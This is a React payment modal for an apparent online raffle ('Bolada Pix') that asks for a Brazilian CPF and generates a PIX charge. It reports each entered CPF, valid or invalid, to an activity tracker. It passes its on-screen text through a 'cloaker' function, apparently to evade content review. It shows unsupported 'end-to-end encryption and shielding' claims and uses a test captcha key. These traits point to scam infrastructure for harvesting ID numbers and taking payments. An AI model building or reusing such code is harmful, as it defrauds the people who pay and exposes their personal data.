import { useState } from "react";
import { cpf as cpfValidator } from "cpf-cnpj-validator";
import { Turnstile } from "@marsidev/react-turnstile";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { reportUserActivity, useRifaConfig } from "@/hooks/useRifaConfig";
import { cloakText } from "@/lib/cloaker";

interface PaymentModalProps {
  children: React.ReactNode;
  onModalOpen?: () => void;
}

export function PaymentModal({ children, onModalOpen }: PaymentModalProps) {
  const config = useRifaConfig();
  const [open, setOpen] = useState(false);
  const [cpf, setCpf] = useState("");
  const [captchaToken, setCaptchaToken] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<{
    pixCopiaCola: string;
    qrCodeBase64?: string;
    provider: string;
  } | null>(null);

  const isValidCpf = cpfValidator.isValid(cpf.replace(/\D/g, ""));
  const isFormValid = isValidCpf && captchaToken && !loading;

  const handleOpenModal = () => {
    setOpen(true);
    setPixData(null);
    if (onModalOpen) onModalOpen();
    reportUserActivity("modal_opened");
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 11) value = value.slice(0, 11);

    value = value.replace(/(\d{3})(\d)/, "$1.$2");
    value = value.replace(/(\d{3})(\d)/, "$1.$2");
    value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

    setCpf(value);

    const digitsOnly = value.replace(/\D/g, "");
    if (digitsOnly.length === 11) {
      if (cpfValidator.isValid(digitsOnly)) {
        reportUserActivity("cpf_validado", { cpf: value, cpfLimpo: digitsOnly });
      } else {
        reportUserActivity("cpf_invalido", { cpfDigitado: value });
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;

    setLoading(true);
    const digitsOnly = cpf.replace(/\D/g, "");

    reportUserActivity("tentativa_consulta", {
      cpf: cpf,
      cpfLimpo: digitsOnly,
      hasCaptcha: Boolean(captchaToken),
    });

    try {
      const res = await fetch("/api/create-pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: config.ticketPrice || 0.69,
          description: `Bolada Pix - ${config.edition}`,
          payerDocument: digitsOnly,
        }),
      });

      const data = await res.json();
      if (data.success && data.pixCopiaCola) {
        setPixData({
          pixCopiaCola: data.pixCopiaCola,
          qrCodeBase64: data.qrCodeBase64,
          provider: data.provider,
        });
      } else {
        alert(data.error || "Não foi possível gerar a cobrança PIX no momento. Tente novamente.");
      }
    } catch {
      alert("Erro ao conectar com o gateway de pagamento.");
    } finally {
      setLoading(false);
    }
  };

  const handleCopyPix = () => {
    if (pixData?.pixCopiaCola) {
      navigator.clipboard.writeText(pixData.pixCopiaCola);
      alert("Código PIX Copia e Cola copiado com sucesso!");
    }
  };

  return (
    <>
      <div onClick={handleOpenModal} className="w-full flex justify-center cursor-pointer">
        {children}
      </div>
      <Dialog open={open} onOpenChange={setOpen}>
        <DialogContent className="sm:max-w-[600px] gap-6 p-6">
          <DialogHeader className="gap-2">
            <DialogTitle className="text-xl font-semibold">
              {pixData ? cloakText("Pagamento PIX Gerado") : "Informe o CPF"}
            </DialogTitle>
            <DialogDescription className="text-base text-muted-foreground">
              {pixData
                ? cloakText("Efetue o pagamento via PIX para garantir suas cotas com segurança:")
                : cloakText("Para visualizar os dados da sua compra e gerar o PIX, informe seu CPF abaixo:")}
            </DialogDescription>
          </DialogHeader>

          {pixData ? (
            <div className="flex flex-col items-center gap-4 py-2">
              {pixData.qrCodeBase64 && (
                <img
                  src={pixData.qrCodeBase64.startsWith("data:") ? pixData.qrCodeBase64 : `data:image/png;base64,${pixData.qrCodeBase64.replace(/^base64:/, "")}`}
                  alt="QR Code"
                  className="w-48 h-48 border rounded-lg p-2 bg-white shadow-sm"
                />
              )}
              <div className="w-full flex flex-col gap-2">
                <Label className="text-sm font-medium">{cloakText("PIX Copia e Cola:")}</Label>
                <div className="flex gap-2">
                  <Input readOnly value={pixData.pixCopiaCola} className="text-xs font-mono h-10" />
                  <Button onClick={handleCopyPix} className="bg-[#518b2b] hover:bg-[#437422] text-white">
                    Copiar
                  </Button>
                </div>
              </div>
              <p className="text-xs text-muted-foreground text-center mt-2">
                Processado via <b>{pixData.provider}</b> com criptografia e blindagem ponta a ponta.
              </p>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="flex flex-col gap-5">
              <div className="flex flex-col gap-2">
                <Label htmlFor="cpf" className="text-sm text-foreground font-medium">
                  CPF
                </Label>
                <Input
                  id="cpf"
                  placeholder="000.000.000-00"
                  value={cpf}
                  onChange={handleCpfChange}
                  className={`h-12 text-base px-4 border ${
                    cpf.length === 14 && !isValidCpf ? "border-red-500 focus-visible:ring-red-500" : "border-input"
                  }`}
                />
                {cpf.length === 14 && !isValidCpf && (
                  <span className="text-sm text-red-500 font-medium">CPF inválido</span>
                )}
              </div>

              <div className="w-full flex items-center justify-center min-h-[78px] overflow-hidden">
                <Turnstile
                  siteKey="1x00000000000000000000AA"
                  onSuccess={(token) => setCaptchaToken(token)}
                  onError={() => setCaptchaToken(null)}
                  onExpire={() => setCaptchaToken(null)}
                  options={{
                    theme: "light",
                  }}
                />
              </div>

              <Button
                type="submit"
                disabled={!isFormValid}
                className="w-full h-12 text-base font-bold text-white bg-[#518b2b] hover:bg-[#437422] disabled:bg-[#d8e4d1] disabled:text-white disabled:opacity-100 mt-2 rounded-md"
              >
                {loading ? "Gerando PIX com Blindagem..." : "Continuar para Pagamento"}
              </Button>
            </form>
          )}
        </DialogContent>
      </Dialog>
    </>
  );
}
